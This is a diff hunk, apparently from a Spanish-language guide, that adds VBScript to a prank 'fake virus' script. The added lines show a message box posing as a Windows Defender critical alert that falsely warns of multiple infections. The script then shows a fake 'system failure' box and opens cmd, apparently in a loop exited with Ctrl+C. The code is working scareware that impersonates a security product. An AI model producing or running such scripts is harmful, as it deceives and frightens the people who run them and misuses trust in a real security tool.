@@ -12,6 +12,10 @@ control c para salir del while true
 
 code:
 
+    Set WshShell = WScript.CreateObject("WScript.Shell")
+    strName = wshShell.ExpandEnvironmentStrings( "%USERNAME%" )
+    x=msgbox ("CrÌtico: Tu sistema está gravemente afectado por múltiples amenazas. Para abortar todos los procesos, pulsa 'Anular'. Para volver a escanear, pulsa 'Reintentar'. Para continuar con todos los procesos, pulsa 'Omitir'." ,2+16, "Virus          encontrando por Windows Defender©")
+    WScript.sleep 2000
     WScript.sleep 2000
     msgbox "Fallo del sistema en %WINDIR%",48,ERROR
     WshShell.Run "cmd"
